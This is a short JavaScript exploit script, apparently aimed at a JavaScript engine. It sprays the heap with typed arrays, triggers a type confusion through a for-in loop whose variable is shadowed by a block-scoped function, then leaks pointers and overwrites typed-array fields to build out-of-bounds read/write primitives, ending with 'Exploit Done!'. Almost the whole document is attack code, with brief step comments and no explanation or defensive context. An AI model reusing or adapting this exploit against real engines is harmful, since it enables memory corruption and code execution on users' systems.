// Define some objects and arrays that will be used for memory manipulation
let leaker_obj = { a: 0 };
let leaker_arr = new Uint32Array(6);
let oob_slave  = new Uint8Array(1024);
let oob_master = new Uint32Array(7);
let spray = [];
let impl_idx = 0;

// Spray the heap with many Uint32Array objects
for (var i = 0; i < 0x10000; i++) {
  // Build new Spray Object
  let x = new Uint32Array(1);
  x[`${i}spray`] = 123;
  spray.push(x);
}

// Define target objects with specific property values
var target = { 
  a: 2.1100820415101592e-303,
  b: false,
  c: true,
  d: 5678
};

// Function to create an object with many properties
function create_impl() {
  let ans = { a: target };
  for (let i = 0; i < 32; i++) 
    ans[`${impl_idx++}x`] = {}; 
  return ans;
}

// Function to trigger the exploit
function trigger(x) {
  // Infinite loop if unexpected behavior
  if (impl.a != target) while(1);
  
  var o = { a: 1 };
  for (var i in o) {
    {
      i = x;
      function i() {}
    }
    o[i];
  }
  
  if (impl.a != target) {
    printf("corrupted!");
    printf(typeof impl.a);
    printf(impl.a.length);
    target.c = leaker_obj;
    leaker_obj.a = leaker_obj;
    let l1 = impl.a[4];
    let l2 = impl.a[5];
    leaker_obj.a = oob_slave;
    let s1 = impl.a[4];
    let s2 = impl.a[5];
    target.c  = leaker_arr;
    impl.a[4] = l1;
    impl.a[5] = l2;
    target.c  = oob_master;
    impl.a[4] = s1;
    impl.a[5] = s2;
    impl.a = target; 
    printf([l1, l2, s1, s2]);
    throw "Exploit Done!";
  }
}

try {
  for (var _ = 0; _ < 1024; _++) {
    trigger({ a: create_impl() });
  }
} catch (e) { printf(e); }
